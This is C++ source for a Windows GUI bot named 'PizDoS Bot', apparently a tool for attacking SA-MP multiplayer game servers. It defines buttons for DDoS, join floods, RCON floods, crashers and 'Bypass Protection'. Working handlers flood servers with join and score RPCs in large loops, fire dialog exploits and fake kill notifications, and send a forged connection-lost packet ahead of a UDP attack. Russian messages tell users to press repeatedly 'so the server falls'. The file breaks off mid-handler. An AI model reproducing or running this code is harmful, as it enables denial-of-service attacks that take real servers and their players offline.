#include "main.h"
#include <iostream>
#include <stdio.h>
#include <windows.h>

// Code taken from http://www.rohitab.com/discuss/topic/37441-how-to-change-color-of-selected-text-in-listbox/page__view__findpost__p__10081946

// Child Window/Control IDs
#define IDC_LBLINFO             100
#define IDC_LSTCUSTOM           101
#define IDC_INPUTBOX			102
// Globals
HWND hwnd, texthwnd, loghwnd, inputhwnd, switchers_list, spam_amount, change_name,change_server,port,regushko,reason,kolvo,changer,changer2,changer3,rdp,rdp1,rdp2,rdpq,rdpw,rdpe,rdpr,rdpt,rdpy,rdpu,rdpi,rdpo,rdpp,aaa,aaaa,bbb,bbbb,nnnn,change_ip,zzz,zzzz,addbot,addbotn;
HINSTANCE g_hInst;
HFONT g_hfText;

#define MINUS 330

#define SetItemPos( id, x, y, w, h ) \
	hDWP = DeferWindowPos(hDWP, GetDlgItem(hwnd, id), NULL, x, y, w, h, SWP_NOZORDER | SWP_NOREDRAW);

#define CLICKED(ID) MAKELONG(ID, BN_CLICKED)
#define AddButton(id, text) \
	hWndChild = CreateWindowEx(0, WC_BUTTON, TEXT(text), BS_DEFPUSHBUTTON | BS_TEXT | WS_CHILD | WS_TABSTOP | WS_VISIBLE, 0, 0, 0, 0, hWnd, (HMENU)id, g_hInst, NULL); \
	SendMessage(hWndChild, WM_SETFONT, (WPARAM)g_hfText, FALSE);

#define AddTextBox(id, text, limit) \
	hWndChild = CreateWindowEx(0, WC_EDIT, TEXT(text), WS_CHILD | WS_TABSTOP | WS_VISIBLE | WS_BORDER, 0, 0, 0, 0, hWnd, (HMENU)id, g_hInst, NULL); \
	SendMessage(hWndChild, EM_LIMITTEXT, limit, 0); \
	SendMessage(hWndChild, WM_SETFONT, (WPARAM)g_hfText, FALSE);

#define AddListBox(id) \
	hWndChild = CreateWindowEx(WS_EX_CLIENTEDGE, WC_LISTBOX, NULL, LBS_NOINTEGRALHEIGHT | LBS_NOTIFY | LBS_OWNERDRAWFIXED | WS_VSCROLL | WS_CHILD | WS_TABSTOP | WS_VISIBLE, \
	0, 0, 0, 0, hWnd, (HMENU)(id), g_hInst, NULL); \
	SendMessage(hWndChild, WM_SETFONT, (WPARAM)g_hfText, FALSE);

#define AddStaticText(id, text) \
	hWndChild = CreateWindowEx(0, WC_STATIC, TEXT(text), SS_LEFT | WS_CHILD | WS_VISIBLE, 0, 0, 0, 0, hWnd, (HMENU)(id), g_hInst, NULL); \
	SendMessage(hWndChild, WM_SETFONT, (WPARAM)g_hfText, FALSE);

// Prototypes
LRESULT CALLBACK MainWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
BOOL CalcWindowTextSize(HWND hWnd, LPRECT rcFit);
BOOL CenterWindow(HWND hWnd, HWND hWndCenter);

LRESULT CALLBACK MainWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch(uMsg)
	{
				// This message is sent for each owner drawn child and only once for LBS_OWNERDRAWFIXED.
		// If we had used LBS_OWNERDRAWVARIABLE it is sent for each item.
	case WM_MEASUREITEM:
		{
			LPMEASUREITEMSTRUCT lpMeasureItem = (LPMEASUREITEMSTRUCT)lParam;
			// Is this measure request for our control?
			if(lpMeasureItem->CtlID == IDC_LSTCUSTOM)
			{
				TEXTMETRIC tm;
				HWND hWndItem = GetDlgItem(hWnd, IDC_LSTCUSTOM);
				HDC  hdcItem  = GetDC(hWndItem);
				//PlaySound("Sound/welcome.wav",NULL,SND_ASYNC);
				if(GetTextMetrics(hdcItem, &tm))
					// Set the item height to that of the font + 10px padding
					lpMeasureItem->itemHeight = tm.tmInternalLeading + 
					tm.tmHeight + tm.tmExternalLeading + 1;

				ReleaseDC(hWndItem, hdcItem);
				return TRUE;
			}
		}
		break;

		// This message is sent for each owner drawn child when it needs to be rendered.
	case WM_DRAWITEM:
		{
			LPDRAWITEMSTRUCT lpDrawItem = (LPDRAWITEMSTRUCT)lParam;
			// Is this draw request for our control?
			if(lpDrawItem->CtlID == IDC_LSTCUSTOM)
			{
				// Get the text pointer
				LPTSTR lpText = (LPTSTR)lpDrawItem->itemData;
				COLORREF textColor = RGB(255, 0, 0);
				COLORREF bkColor = RGB(0, 0, 0);

				if(!strncmp(lpText, "[ЧАТ] ", 7))
					textColor = RGB(settings.bChatColorRed, settings.bChatColorGreen, settings.bChatColorBlue);

				if(!strncmp(lpText, "[СЕРВЕР] ", 7))
					textColor = RGB(settings.bCMsgRed, settings.bCMsgGreen, settings.bCMsgBlue);
								

				if(settings.iFind)
				{
					for(int i = 0; i < MAX_FIND_ITEMS; i++)
					{
						if(!settings.findItems[i].iExists)
							continue;

						if(strstr(lpText, settings.findItems[i].szFind))
						{
							textColor = RGB(settings.findItems[i].bTextRed,
								settings.findItems[i].bTextGreen,
								settings.findItems[i].bTextBlue);
							bkColor = RGB(settings.findItems[i].bBkRed,
								settings.findItems[i].bBkGreen,
								settings.findItems[i].bBkBlue);
						}
					}
				}

				// Set colors based on selected state
				if(lpDrawItem->itemState & ODS_SELECTED)
				{
					SetBkColor(lpDrawItem->hDC, RGB(0, 0, 0));
					SetTextColor(lpDrawItem->hDC, textColor);
				}
				else
				{
					SetBkColor(lpDrawItem->hDC, bkColor);
					SetTextColor(lpDrawItem->hDC, textColor);
				}

				// Draw the text and fill in the background at the same time
				//  with 5px offset for padding
				ExtTextOut(lpDrawItem->hDC,
					lpDrawItem->rcItem.left + 5, lpDrawItem->rcItem.top + 5,
					ETO_OPAQUE | ETO_CLIPPED, &lpDrawItem->rcItem,
					lpText, lstrlen(lpText), NULL);

				// If this item has the focus add the focus rect
				if(lpDrawItem->itemState & ODS_FOCUS)
					DrawFocusRect(lpDrawItem->hDC, &lpDrawItem->rcItem);
				return TRUE;
			}
		}
		break;

	case WM_DELETEITEM:
		{
			LPDELETEITEMSTRUCT lpDeleteItem = (LPDELETEITEMSTRUCT)lParam;
			if(lpDeleteItem->CtlID == IDC_LSTCUSTOM)
			{
				delete (LPTSTR)lpDeleteItem->itemData;
				return TRUE;
			}
		}
		break;

	case WM_GETMINMAXINFO:
		{
			LPMINMAXINFO lpInfo = (LPMINMAXINFO)lParam;
			if(lpInfo)
				lpInfo->ptMinTrackSize.x = 250, lpInfo->ptMinTrackSize.y = 300;
		}
		return 0;

		// Initialize our window and create our child controls.
	case WM_CREATE:
		{
			hwnd = hWnd;

			HWND hWndChild;

			CenterWindow(hWnd, NULL);

			// Create the info text at the the top.
			hWndChild = CreateWindowEx(0, WC_BUTTON, TEXT("PizDoS Bot v.CR:MP"),
				SS_LEFT | WS_CHILD | WS_VISIBLE,
				0, 0, 0, 0, hWnd, (HMENU)(IDC_LBLINFO), g_hInst, NULL);
			if(!hWndChild) return -1;
			SendMessage(hWndChild, WM_SETFONT, (WPARAM)g_hfText, FALSE);
			texthwnd = hWndChild;
			// Create the custom/owner drawn listbox
			loghwnd = AddListBox(IDC_LSTCUSTOM);

			// Create the input box.
			inputhwnd = AddTextBox(IDC_INPUTBOX, "", 255);
			
			// Create the send button.
			AddButton(IDCANCEL,"Send");
			AddButton(103, "<Spam");
spam_amount=AddTextBox(104,"100", 10);
			AddButton(105,"Spawn");
			AddButton(106,"Exit");
			AddButton(107,"Reconnect");
			AddButton(108,"<Change");
change_name=AddTextBox(109,"PizDoS_Bot", 24);
			AddButton(110,"<Fakey");
     reason=AddTextBox(111,"ID",2);
    kolvo=AddTextBox(112,"Количество",8);
			rdpq=AddButton(113,"<Dialog");
  rdpw=AddTextBox(114,"5555555",255);
			AddButton(115,"Kill");
			AddButton(116,"Stats");
			AddButton(117,"Req");
			AddButton(118,"RC");
			rdpe=AddButton(119,"<Rcon");
			rdpr=AddTextBox(120,"5555555",255);
			rdpu=AddButton(126,"<Pickup");
			rdpi=AddTextBox(127,"55555",255);
			AddButton(135,"<Join");
			change_ip=AddTextBox(136,"192.168.1.2:7777",1000);
			AddButton(130,"©");
			rdpt=AddButton(124,"<UDP");
			rdpy=AddTextBox(125,"5555555",255);
			rdpo=AddButton(128,"<NPC");
			rdpp=AddTextBox(129,"5555555",255);
		//AddButton(121,"Crasher");
	    rdp1=AddButton(122,"<DDoS");
        rdp2=AddTextBox(123,"5555555",7);
		aaa=AddButton(131,"<Cmd-F");
        aaaa=AddTextBox(132,"5555555",7);
		bbb=AddButton(133,"<Rcon-F");
        bbbb=AddTextBox(134,"555555",7);
		zzz=AddButton(137,"<U-BUG");
		zzzz=AddTextBox(138,"5",255);
		AddButton(139,"Bypass Protection");
		AddButton(141,"LGR");
		AddButton(142,"MegaD");
		AddButton(143,"DoS +100");
		AddButton(144,"=DoZeR=");
		AddButton(145,"Nagibator");
		AddButton(146,"Kill Fix");
		AddButton(147,"FakeJoin");
		AddButton(148,"Shura");
		AddButton(149,"ICC");
		AddButton(150,"Join Flood");
		AddButton(151,"Join|&|Exit");
		AddButton(152,"Join|&|Reg");
		addbot=AddButton(153,"<Add Bots");
		addbotn=AddTextBox(154,"Nick_Name", 90);
		AddButton(155,"RconCrash");
		AddButton(156,"Samp-Rp DDoS");
		AddButton(157,"Dead Flood");
		AddButton(158,"Samp-Rp DDoS [Дубль-2]");
		AddButton(220, "<CrazyFlood");
		changer=AddTextBox(221,"Crazy Flooder ept", 90);
		AddButton(228,"Motherfucker");
		AddButton(229,"Мониторинг");
		AddButton(230,"FAQ");
		AddButton(231,"AntiBan");
		AddButton(232,"BRDoS");
		//switchers_list = AddListBox(111);

			SetFocus(inputhwnd);
           }return 0;

	case WM_WINDOWPOSCHANGING:
	case WM_WINDOWPOSCHANGED:
		{
			HDWP hDWP;
			RECT rc;

			// Create a deferred window handle.
			if(hDWP = BeginDeferWindowPos(4))
			{
				// Deferring 4 child controls
				GetClientRect(hWnd, &rc);

				// Calculate the size needed for the static text at the top
				RECT rcText = { 10, 20, rc.right - 20, 0 } ;
				CalcWindowTextSize(GetDlgItem(hWnd, IDC_LBLINFO), &rcText);

				// Defer each window move/size until end and do them all at once.
				SetItemPos( IDC_LBLINFO, 10, 10, rc.right - 20, rcText.bottom );

				// Move/Size the listbox
				SetItemPos( IDC_LSTCUSTOM, 10, rcText.bottom + 20, rc.right - 20 - 2, rc.bottom - rcText.bottom - 65 - MINUS );

				// Move/Size the input box
				SetItemPos( IDC_INPUTBOX, (rc.right) - 470,  rc.bottom - 30, 330, 20 );

				// Move/Size the send button
				//SetItemPos( IDCANCEL, (rc.right) - 70, rc.bottom - 55, 60, 20 );
				// Move/Size Spam Items
				SetItemPos( 103, (rc.right) - 70, rc.bottom - 30, 60, 20 ); // Button
				SetItemPos( 104, rc.right - 135, rc.bottom - 30, 60 , 20 ); // TextBox
				// spawn
				SetItemPos( 105, (rc.right) - 340, rc.bottom - 135, 60, 20 );
				// exit
				SetItemPos( 106, (rc.right) - 135, rc.bottom - 135, 50, 20 );
				// Reconnect
				SetItemPos( 107, (rc.right) - 220, rc.bottom - 135, 80, 20 );
				// Move/Size Change name Items
				SetItemPos( 108, (rc.right) - 315, rc.bottom - 55, 60, 20 ); // Button
				SetItemPos( 109, rc.right - 470, rc.bottom - 55, 150 , 20 ); // TextBox
				// Move/Size Change server name Items
				SetItemPos( 110, (rc.right) - 70, rc.bottom - 55, 60, 20 ); // Button
				SetItemPos( 111, rc.right - 115, rc.bottom - 55, 40 , 20 ); // TextBox
				SetItemPos( 112, rc.right - 240, rc.bottom - 55, 120 , 20 ); // TextBox
				// Move/Size REG Items
				SetItemPos( 113, (rc.right) - 395, rc.bottom - 80, 65, 20 ); // Button
				SetItemPos( 114, rc.right - 470, rc.bottom - 80, 70 , 20 ); // TextBox
				// join
				SetItemPos( 115, (rc.right) - 395, rc.bottom - 135, 50, 20 );
				// lagger
				SetItemPos( 116, (rc.right) - 470, rc.bottom - 135, 70, 20 );
				// ddos
				SetItemPos( 117, (rc.right) - 275, rc.bottom - 135, 50, 20 );
				// invalid
				SetItemPos( 118, (rc.right) - 80, rc.bottom - 135, 70, 20 );
				// Move/Size CHANGER Items
				SetItemPos( 119, (rc.right) - 250, rc.bottom - 105, 60, 20 ); // Button
				SetItemPos( 120, rc.right - 325, rc.bottom - 105, 70 , 20 ); // TextBox
				// crasher
				//тест
				SetItemPos( 124, (rc.right) - 250, rc.bottom - 80, 60, 20 ); // Button
				SetItemPos( 125, rc.right - 325, rc.bottom - 80, 70 , 20 ); // TextBox
				//тест3
				SetItemPos( 128, (rc.right) - 110, rc.bottom - 80, 60, 20 ); // Button
				SetItemPos( 129, rc.right - 185, rc.bottom - 80, 70 , 20 ); // TextBox
				//тест 2
				SetItemPos( 126, (rc.right) - 110, rc.bottom - 105, 60, 20 ); // Button
				SetItemPos( 127, rc.right - 185, rc.bottom - 105, 70 , 20 ); // TextBox
				//SetItemPos( 121, (rc.right) - 395, rc.bottom - 165, 50, 20 );
				//тест4
				SetItemPos( 130, (rc.right) - 45, rc.bottom - 105, 35, 45 ); // Button
				// Move/Size RDP Items
				SetItemPos( 122, (rc.right) - 395, rc.bottom - 105, 65, 20 ); // Button
				SetItemPos( 123, rc.right - 470, rc.bottom - 105, 70 , 20 ); // TextBox
				//ddos2
				SetItemPos( 131, (rc.right) - 395, rc.bottom - 160, 65, 20 ); // Button
				SetItemPos( 132, rc.right - 470, rc.bottom - 160, 70 , 20 ); // TextBox
				//cmdF
				SetItemPos( 133, (rc.right) - 250, rc.bottom - 160, 60, 20 ); // Button
				SetItemPos( 134, rc.right - 325, rc.bottom - 160, 70 , 20 ); // TextBox
				//qqqqqqqqqqq
				SetItemPos( 135, (rc.right) - 315, rc.bottom - 185, 50, 20 ); // Button
				SetItemPos( 136, rc.right - 470, rc.bottom - 185, 150 , 20 ); // TextBox
				///ntcnsds
				SetItemPos( 137, (rc.right) - 110, rc.bottom - 160, 60, 20 ); // Button
				SetItemPos( 138, rc.right - 185, rc.bottom - 160, 70 , 20 ); // TextBox
				///eeeeeee
				SetItemPos( 139, (rc.right) - 260, rc.bottom - 185, 140, 20 ); // Button
				//тест6
				SetItemPos( 141, (rc.right) - 45, rc.bottom - 185, 35, 45 ); // Button
				///тест тоже
				SetItemPos( 142, (rc.right) - 110, rc.bottom - 185, 60, 20 ); // Button
				//fix fake kill
				SetItemPos( 143, rc.right - 470, rc.bottom - 210, 90 , 20 ); // TextBox
				/////////////
				SetItemPos( 144, rc.right - 375, rc.bottom - 210, 90 , 20 ); // TextBox
				////////////
				SetItemPos( 145, rc.right - 280, rc.bottom - 210, 70 , 20 ); // TextBox
				/////////
				SetItemPos( 146, rc.right - 205, rc.bottom - 210, 70 , 20 ); // TextBox
				/////////
				SetItemPos( 147, rc.right - 130, rc.bottom - 210, 70 , 20 ); // TextBox
				/////////
				SetItemPos( 148, rc.right - 55, rc.bottom - 210, 45 , 20 ); // TextBox
				////////
				SetItemPos( 149, rc.right - 470, rc.bottom - 235, 90 , 20 ); // TextBox
				////////
				SetItemPos( 150, rc.right - 375, rc.bottom - 235, 90 , 20 ); // TextBox
				////////
				SetItemPos( 151, rc.right - 280, rc.bottom - 235, 90 , 20 ); // TextBox
				////////
				SetItemPos( 152, rc.right - 185, rc.bottom - 235, 90 , 20 ); // TextBox
				// ================ *** ADD BOT [NEW] *** ===================== //
				SetItemPos( 154, rc.right - 470, rc.bottom - 260, 160 , 20 ); // TextBox
				SetItemPos( 153, rc.right - 305, rc.bottom - 260, 70 , 20 ); // TextBox
				////////
				SetItemPos( 155, rc.right - 90, rc.bottom - 235, 80 , 20 ); // TextBox
				/////////////////////////////////////////
				SetItemPos( 156, rc.right - 230, rc.bottom - 260, 120 , 20 ); // TextBox
				//////////////////////////////////////
				SetItemPos( 157, rc.right - 105, rc.bottom - 260, 95 , 20 ); // TextBox
				/////////////////////////////////////////
				SetItemPos( 158, rc.right - 470, rc.bottom - 310, 180 , 20 ); // TextBox
				//////////////////////////////////////////
				SetItemPos( 221, rc.right - 470, rc.bottom - 285, 363 , 20 ); // TextBox
				SetItemPos( 220, rc.right - 102, rc.bottom - 285, 90 , 20 ); // TextBox
				/////////////////////////////////////////
				SetItemPos( 228, rc.right - 285, rc.bottom - 310, 100 , 20 ); // TextBox
				/////////////////////////////////////////
				SetItemPos( 229, rc.right - 180, rc.bottom - 310, 90 , 20 ); // TextBox
				/////////////////////////////////////////
				SetItemPos( 230, rc.right - 85, rc.bottom - 310, 74 , 20 ); // TextBox
				/////////////////////////////////////////
				SetItemPos( 231, rc.right - 470, rc.bottom - 335, 80 , 20 ); // TextBox
				/////////////////////////////////////////
				SetItemPos( 232, rc.right - 385, rc.bottom - 335, 80 , 20 ); // TextBox
				/////////////////////////////////////////
				
				// Move/Size Change server name Items
				//SetItemPos( 125, (rc.right) - 70, rc.bottom - 160, 60, 20 ); // Button
				//SetItemPos( 126, rc.right - 100, rc.bottom - 160, 25 , 20 ); // TextBox
				//SetItemPos( 127, rc.right - 175, rc.bottom - 160, 70 , 20 ); // TextBox
				// Move/Size ListBox
				//SetItemPos( 111, rc.right - 95, rcText.bottom + 20, 80, rc.bottom - rcText.bottom - 10 - MINUS ); 
				// Resize all windows under the deferred window handled at the same time.
				EndDeferWindowPos(hDWP);

				// We told DeferWindowPos not to redraw the controls so we can redraw
				// them here all at once.
				RedrawWindow(hWnd, NULL, NULL, RDW_INVALIDATE | RDW_ALLCHILDREN | 
					RDW_ERASE | RDW_NOFRAME | RDW_UPDATENOW);
			}
		}
		return 0;

		// Handle the notifications of button presses.
	case WM_COMMAND:
		// If it was a button press and it came from our button.
		switch(wParam)
		{
		case CLICKED(IDCANCEL):
			{
				if(GetWindowTextLength(inputhwnd) == 0)
					break;
				char str[512];
				SendMessage(inputhwnd, WM_GETTEXT, (WPARAM)512, (LPARAM)str);
				SendMessage(inputhwnd, WM_SETTEXT, 0, (LPARAM)"");
				RunCommand(str, 0);

				SetFocus(inputhwnd);
			}
			break;
		case CLICKED(103):
			{
				if(GetWindowTextLength(inputhwnd) == 0 || GetWindowTextLength(spam_amount) == 0)
					break;
				char amou[12];
				char str[512];
				SendMessage(inputhwnd, WM_GETTEXT, (WPARAM)512, (LPARAM)str);
				SendMessage(spam_amount, WM_GETTEXT, (WPARAM)11, (LPARAM)amou);
				int i = atoi(amou);
				for (int a = 0; a < i; a++)
					RunCommand(str, 0);

				SetFocus(inputhwnd);
			}
			break;
		case CLICKED(105):
		{
       RakNet::BitStream bsSendSpawn;	
	    bsSendSpawn.Write(rand()%7);
       pRakClient->RPC(&RPC_Spawn, &bsSendSpawn, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
 		Log(" * Заспавнен.");
	   }
		break;
	   

		case CLICKED(130):
		{
        sendChat("Company: Zeta Hack");
		sendChat("Product: PizDoS Bot v0.3e");
		sendChat("Author: AlexDrift");
		sendChat("Skype: alexdrift----------");
		sendChat("Site: WWW.ZETA-HACK.RU");
		system("start https://vk.com/alexdrift1137");
		}
		break;

		case CLICKED(231):
		{
		MessageBox(NULL, "AntiBan-работает только у тех у кого динамический IP.", "Внимание!",0);
        system("start Ultimate/rakinternet.dll");
		}
		break;

		


		case CLICKED(230):
		{
        MessageBox(NULL, "Категорически запрещено.\n\Запускать более 2х окон бота и досить с них.\n\Это может привести к сильному зависанию компьютера или же вылету программы.\n\Запрещено активировать одновременно несколько функций, это приведет к вылету программы.\n\Разрешено только по 1 функции не больше хотите использовать другую отключите ту которую включали.\n\Для тех кто ноет типа прога хуйня и не DoSит сервера-я не виноват что у вас руки из дупла ростут. Все функции работают на ОТЛИЧНО.", "FAQ",0);
		MessageBox(NULL, "Если вы купили эту программу у кого то, то считайте что на вас заработали(наебали). Программа совершенно бесплатна и находится в свободном доступе.", "Внимание!",0);
		system("start http://WWW.ZETA-HACK.RU/");
		}
		break;


		case CLICKED(229):
		{
        SYSTEMTIME time;
		GetLocalTime(&time);
		Log("======================Мониторинг==================================================");
		Log("  Дата %02d/%02d/%02d Часы %02d:%02d:%02d",time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond);
		Log("  Ник: %s",settings.server.szNickname);
		Log("  Адреc: %s:%d",settings.server.szAddr,settings.server.iPort);
		Log("  runMode: %d",settings.runMode);
		Log("  Режим консоли: %d",settings.iConsole);
		Log("  Autorun: %d",settings.iAutorun);
		Log("  Пароль: %s",settings.server.szPassword);
		Log("  СкинID: %d",settings.iClassID);
		Log("  Find: %d",settings.iFind);
		Log("  Режим Timestamps: %d",settings.iPrintTimestamps);
		Log("  ImitateChatName: %s",settings.szImitateChatPlayerName);
		Log("  FollowingPlayerName: %s",settings.szFollowingPlayerName);
		Log("  FollowingVehicleID: %d",settings.iFollowingWithVehicleID);
		Log("  PingPlayerID: %d",playerInfo[g_myPlayerID].dwPing);
		Log("  Кол-во игроков: %d",getPlayerCount());
		Log("  HostName: %s",g_szHostName);
		Log("======================Мониторинг==================================================");
		}
		break;



		case CLICKED(149):
		{
         Log("Атака Invalid client connecting началась!");
		 Log("После рестарта бота, активируйте еще!");
			for(int a=0;a<99999;a++)
	{
		RakNet::BitStream bsSend;
		bsSend.Write(NETGAME_VERSION);
		pRakClient->RPC(&RPC_ClientJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		iAreWeConnected = 1;
}	}
		break;
		

		case CLICKED(232):
		{
        if(!settings.test231556x) 
		{
		Log(" * Big Russian DoS включен.");
		settings.test231556x=true;
		}
		else
		{
		settings.test231556x=false;
		Log(" * Big Russian DoS отключен");
		}
		}
		break;


		case CLICKED(233):
		{
        if(!settings.test231556xq) 
		{
		Log(" * test включен.");
		settings.test231556xq=true;
		}
		else
		{
		settings.test231556xq=false;
		Log(" * test отключен");
		}
		}
		break;


		case CLICKED(220):
		{
        if(!settings.changer) 
		{
		Log(" * Changer включен.");
		settings.changer=true;
		}
		else
		{
		settings.changer=false;
		Log(" * Changer отключен");
		}
		}
		break;


		case CLICKED(139):
		{
        RakNet::BitStream bs;
		bs.Write((BYTE)ID_CONNECTION_LOST);
		pRakClient->Send(&bs, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		Log("ЖДЕМ 10 СЕКУНД ДО СЛОМА ЗАЩИТЫ->И НАЧИНАЕМ UDP АТАКУ!");
		}
		break;

		case CLICKED(106):
		{
		ExitProcess(0);
		}
		break;
		case CLICKED(107):
		{
		sampDisconnect(0);
		resetPools(1, 0);
		}
		break;
		case CLICKED(108):
		{
		if(GetWindowTextLength(change_name) < 3)
		break;
		char str[512];
		SendMessage(change_name, WM_GETTEXT, (WPARAM)512, (LPARAM)str);
		char szNewNick[24];
		iGettingNewName = true;
		sprintf(szNewNick, "%s", str);
		Log(" * Ник сменён на %s", szNewNick);
		strcpy(g_szNickName, szNewNick);
		resetPools(1, 0);
		}
		break;

		case CLICKED(110):
	    {
		if(GetWindowTextLength(reason) == 0 || GetWindowTextLength(kolvo) == 0)
		break;
		char amou[41];
	    char str[512];
		SendMessage(kolvo, WM_GETTEXT, (WPARAM)512, (LPARAM)str);
		SendMessage(reason, WM_GETTEXT, (WPARAM)11, (LPARAM)amou);
		int i = atoi(str);
		int d = atoi(amou);
		for (int a = 0; a < i; a++)
		{
		for(int i = 0; i<1; i++){
        RakNet::BitStream bsSendSpawn;
        pRakClient->RPC(&RPC_Spawn, &bsSendSpawn, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		SendWastedNotification(d,g_myPlayerID);			
		}
		}				//SetFocus(inputhwnd);
		}
		break;

		case CLICKED(113):
		{
		if(GetWindowTextLength(rdpq) == 0 || GetWindowTextLength(rdpw) == 0)
		break;
		char amou1[12];
		char str1[512];
		SendMessage(rdpq, WM_GETTEXT, (WPARAM)512, (LPARAM)str1);
		SendMessage(rdpw, WM_GETTEXT, (WPARAM)11, (LPARAM)amou1);
		Log("* Заданное кол-во Dialog Exploitov [%s] успешно запущено.",amou1);
		int i = atoi(amou1);
		for (int a = 0; a < i; a++)
		{
       dialogWarnings();
		}
		SetFocus(rdpq);
		}
		break;

		case CLICKED(141):
		{
		if(!settings.test1){
		Log(" * Lagger включен.");
		settings.test1=true;
		}else{
		settings.test1=false;
		Log(" * Lagger выключен.");
		}}
		break;

		case CLICKED(148):
		{
Log("DoS Активирован! Нажимайте на кнопку каждые 3-10 секунд, что бы сервер упал!");
for(int a=0;a<MAX_PLAYERS;a++){
RakNet::BitStream bsvehicleDestroyed1;
RakNet::BitStream bsvehicleDestroyed2;
RakNet::BitStream bsvehicleDestroyed3;
RakNet::BitStream bsvehicleDestroyed4;
RakNet::BitStream bsvehicleDestroyed13;
RakNet::BitStream bsvehicleDestroyed23;
RakNet::BitStream bsvehicleDestroyed33;
RakNet::BitStream bsvehicleDestroyed43;
RakNet::BitStream bsvehicleDestroyed5;
RakNet::BitStream bsvehicleDestroyed6;
RakNet::BitStream bsvehicleDestroyed;
RakNet::BitStream bsvehicleDestroyed11;
RakNet::BitStream bsvehicleDestroyed21;
RakNet::BitStream bsvehicleDestroyed31;
RakNet::BitStream bsvehicleDestroyed41;
RakNet::BitStream bsvehicleDestroyed51;
RakNet::BitStream bsvehicleDestroyed61;
RakNet::BitStream bsvehicleDestroyed111;
bsvehicleDestroyed1.Write(a);
bsvehicleDestroyed2.Write(a);
bsvehicleDestroyed3.Write(a);
bsvehicleDestroyed4.Write(a);
bsvehicleDestroyed13.Write(a);
bsvehicleDestroyed23.Write(a);
bsvehicleDestroyed33.Write(a);
bsvehicleDestroyed43.Write(a);
bsvehicleDestroyed5.Write(a);
bsvehicleDestroyed6.Write(a);
bsvehicleDestroyed.Write(a);
bsvehicleDestroyed11.Write(a);
bsvehicleDestroyed21.Write(a);
bsvehicleDestroyed31.Write(a);
bsvehicleDestroyed41.Write(a);
bsvehicleDestroyed51.Write(a);
bsvehicleDestroyed61.Write(a);
bsvehicleDestroyed111.Write(a);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed2, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed3, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed4, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed5, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed6, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed11, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed21, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed31, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed41, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed51, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed61, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed111, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed13, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed23, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed33, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed43, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}}  
		break;

		case CLICKED(158):
		{
		Log("SRP DoS Активирован! Нажимайте на кнопку каждые 3-10 секунд, что бы сервер упал!");
		RolePlayDos32(); 
		}
		break;

		case CLICKED(157):
		{
		if(!settings.test231555){
		Log(" * Dead Flood включен.");
		settings.test231555=true;
		}else{
		settings.test231555=false;
		Log(" * Dead Flood выключен.");
		}}
		break;

		case CLICKED(156):
		{
		if(!settings.test231556){
		Log(" * Samp-Rp DDoS включен.");
		settings.test23155=true;
		}else{
